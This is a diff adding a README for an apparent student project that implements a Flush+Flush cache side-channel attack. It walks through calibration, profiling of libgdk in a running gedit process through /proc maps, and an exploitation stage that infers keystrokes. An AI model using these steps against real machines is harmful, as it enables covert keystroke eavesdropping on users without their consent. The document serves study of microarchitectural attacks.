@@ -1,0 +1,47 @@
+Flush&Flush Project, Tamir&Danielle
+---
+Run this project on linux machine. Here are the instructions on how to run each stage of the attack:
+
+1. Calibration:
+cd Calibration
+make
+./calibration
+
+After Running Calibration, don't forget to edit the hit/miss threshold to fit to your machine, in order to get optimal results.
+The Threshold should be after the maximum value on the left column (miss flush time) and before the maximum value of the right column (hit flush time).
+
+
+
+
+2A. Profiling (Automated):
+The Automated stage rely on xdo-library installed on your machine. you can install it using "sudo apt install xdotool"
+cd Profiling 						//Make sure that there is an open gedit window
+cd Automated
+make
+ps -A | grep gedit 					//Find pid of gedit - result should be 3766 pts/0    00:00:00 gedit
+cat /proc/3766/maps | grep r-x | grep gdk-3		//Insert pid instead of 3766.
+
+Those commands should give us the following output, which consists of the system information about libgdk:
+7f12d2a97000-7f12d2b82000 r-xp 00000000 103:07 1186641                   /usr/lib/x86_64-linux-gnu/libgdk-3.so.0.2200.30
+
+Take this output and run the profiling stage:
+./spy --duration-- --output of prev stage-- > Profiling_Results.txt
+For example:
+echo "switch to gedit window"; sleep 5; ./spy 20 7f12d2a97000-7f12d2b82000 r-xp 00000000 103:07 1186641                   /usr/lib/x86_64-linux-gnu/libgdk-3.so.0.2200.30 > Profiling_Results.txt
+The profiling stage relays on gedit being the open window. so before the profiling starts, we have to focus on this window.
+
+2B. Profiling (Non-Automated):
+Same running process as 2A, except the code is in the Template folder, within the Profiling folder.
+Without libxdotool we can use the generic tool.
+This tool requires you to generate the events somehow. Depending on what you want to profile this can be another program simulating key strokes, a jammed key, a program which constantly triggers the event to exploit (an encryption...).
+In our case we will just jam a key and create a Cache Template showing which addresses react on key strokes. 
+To filter false positive cache hits we should then perform a second profiling scan without jamming a key.
+
+
+
+
+3. Exploitation:
+cd Exploitation
+make
+./spy /usr/lib/x86_64-linux-gnu/libgdk-3.so.0.2200.30	> Results.txt  		//Notice that the library address should be identical to the one we got when running stage 2. It may change between machines.
+Insert the Addresses and keys bindings,found in Profiling_Results.txt into stdout. end input with null-terminator.
